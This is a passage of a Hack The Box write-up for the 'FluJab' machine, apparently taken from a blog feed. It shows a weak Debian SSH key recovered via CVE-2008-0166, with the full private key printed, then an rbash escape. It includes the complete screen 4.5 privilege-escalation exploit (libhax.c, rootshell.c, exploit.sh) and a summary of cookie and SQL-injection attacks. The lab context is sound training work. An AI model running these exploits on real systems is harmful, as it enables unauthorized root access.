ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-tried-cve-2008-0166-i-downloaded-the-files-from-here-then-i-extracted-them-in-a-directory-called-cve-2008-0166-then-i-used-grep-to-search-for-the-last-line-in-the-public-key--yv8c1uai3lunrsh9rxfnox1rtz73ucmgtbacomvqy9mpi96rizm2qbe26v1mxiqnktu03cbne8tdd96txonmaxe-through-all-files-&quot;&gt;I tried &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt;&lt;/a&gt;. I downloaded the files from &lt;a href=&quot;https://github.com/g0tmi1k/debian-ssh&quot;&gt;here&lt;/a&gt; then I extracted them in a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;cve-2008-0166&lt;/code&gt;. Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt; to search for the last line in the public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&lt;/code&gt; through all files :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grep -r -n &quot;Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE&quot; cve-2008-0166/*&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-matched-this-public-key--debian_ssh_rsa_4096_x86rsa4096dead0b5b829ea2e3d22f47a7cbde17a6-23269pub-so-i-grabbed-the-private-key--dead0b5b829ea2e3d22f47a7cbde17a6-23269-and-used-it-to-get-ssh&quot;&gt;It matched this public key : &lt;code class=&quot;highlighter-rouge&quot;&gt;debian_ssh_rsa_4096_x86/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub&lt;/code&gt; so I grabbed the private key : &lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; and used it to get ssh.&lt;/h4&gt;
&lt;h4 id=&quot;dead0b5b829ea2e3d22f47a7cbde17a6-23269-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dead0b5b829ea2e3d22f47a7cbde17a6-23269&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-restricted-bash-local-privilege-escalation-vulnerability-in-screen-root-flag&quot;&gt;Bypassing restricted bash, Local Privilege Escalation Vulnerability in screen, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-ssh-access-i-found-myself-in-rbash-&quot;&gt;After getting ssh access I found myself in &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-trying-some-stuff-i-could-bypass-it-by-adding-the--t-option-when-trying-to-ssh-&quot;&gt;After trying some stuff I could bypass it by adding the &lt;code class=&quot;highlighter-rouge&quot;&gt;-t&lt;/code&gt; option when trying to ssh :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@flujab.htb -t &quot;bash --noprofile&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-had-to-fix-my-path-&quot;&gt;Then I had to fix my path :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-some-regular-enumeration-steps-one-of-them-is-searching-for-suid-binaries-&quot;&gt;I did some regular enumeration steps, one of them is searching for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;one-thing-that-caught-my-attention-was-usrlocalsharescreenscreen&quot;&gt;One thing that caught my attention was &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-checked-the-version-of-screen-&quot;&gt;I checked the version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;screen -v&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-version-45-which-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-a-published-exploit-for-it-here-however-by-looking-at-that-exploit-&quot;&gt;It was version 4.5 which is vulnerable to a Local Privilege Escalation Vulnerability and there’s a published exploit for it &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;here&lt;/a&gt;. However by looking at that exploit :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-see-that-its-compiling-stuff-and-unfortunately-gcc-wasnt-installed-on-the-machine-&quot;&gt;We can see that it’s compiling stuff. And unfortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; wasn’t installed on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-had-to-remove-the-c-code-from-the-exploit-and-create-separate-files-then-i-compiled-them&quot;&gt;So I had to remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; code from the exploit and create separate files. Then I compiled them.&lt;/h4&gt;
&lt;h4 id=&quot;libhaxc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
__attribute__ ((__constructor__))
void dropshell(void){
    chown(&quot;/tmp/rootshell&quot;, 0, 0);
    chmod(&quot;/tmp/rootshell&quot;, 04755);
    unlink(&quot;/etc/ld.so.preload&quot;);
    printf(&quot;[+] done!\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;rootshellc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp(&quot;/bin/sh&quot;, NULL, NULL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;compilation-&quot;&gt;Compilation :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -ldl -o libhax.so libhax.c&lt;/code&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o rootshell rootshell.c&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;exploitsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-compiled-binaries-and-the-exploit-script-then-i-downloaded-them-on-the-machine-&quot;&gt;I ran a python server to host the compiled binaries and the exploit script. Then I downloaded them on the machine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-when-i-ran-the-exploit-it-didnt-spawn-a-root-shell-&quot;&gt;But when I ran the exploit it didn’t spawn a root shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-because-i-forgot-that-the-suid-version-of-screen-was-in-usrlocalsharescreenscreen-the-other-one-had-problems-and-didnt-even-start-&quot;&gt;That’s because I forgot that the &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; was in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/share/screen/screen&lt;/code&gt;. The other one had problems and didn’t even start :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-edited-the-path-in-the-exploit-code-&quot;&gt;So I edited the path in the exploit code :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
/usr/local/share/screen/screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 
/tmp/rootshell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---help&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry></feed>